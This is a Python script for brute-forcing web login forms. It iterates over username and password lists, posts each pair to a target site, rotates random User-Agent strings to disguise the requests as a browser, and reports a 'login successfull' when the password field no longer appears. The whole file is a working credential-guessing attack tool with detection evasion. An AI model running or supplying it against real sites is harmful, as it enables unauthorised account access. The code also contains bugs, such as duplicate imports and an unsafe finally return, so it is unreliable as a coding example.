import sys
import time
from scipy import rand


import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl
success = False

def brute(parameters, passwords):
    '''
    sends all combinations for usernames and passwords to the attack function on the login page
    '''

    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               'headers': parameters['req_header'],
               'static_elements': parameters['static_elements'],
               'host': parameters['host']
               }

    # if userlist is provided then checks if passwordlist is provided or just 1 password
    if parameters['user_list']:
        for user in parameters['user_list']:
            user = user.strip()
            user = user.split('\t')
            content['username'] = user[0]
            if passwords:
                for password in passwords:
                    password = password.strip()
                    password = password.split('\t')
                    content['password'] = password[0]
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)
    # if 1 username is provided then checks if passwordlist is provided or just 1 password
    elif passwords:
        content['username'] = parameters['username']
        for password in passwords:
            password = password.strip()
            password = password.split('\t')
            content['password'] = password[0]
            attack(content)

    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)
        




def attack(content):
    '''
   create a packet containing fake headers and the payload(username,password) and submit it to the server
    '''

    url = content['url']

    # build packet headers in order to disguise as a browser
    headers = content['headers']
    headers['User-Agent'] = get_random_user_agent()
    print()
    print()
    print(headers['User-Agent'])
    print()
    print()
    
    payload = {
        content['user_param']: content['username'],
        content['password_param']: content['password']
    }
    payload.update(content['static_elements'])

    if content['method'] == 'post':
        resp = requests.post(content['host'], data=payload, headers=headers)
    else:
        resp = requests.get(url,data=payload,headers=headers)

    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
    # print(resp.text)
    if check_login(resp, content['password_param']):
        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
        global success
        success = True
        sys.exit(1)

def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def check_login(content, password_param):
    '''
    checks if login was successful by checking if status code is 200 and if the password field that
    is contained in the login form is no longer found in the page source
    '''
    read = content.text
    doc = html.document_fromstring(read)
    element = doc.xpath('//input[@type="password"]')

    for field in element:
        if field.get('name') == password_param:
            return False

    if content.status_code != 200:
        return False
    else:
        return True

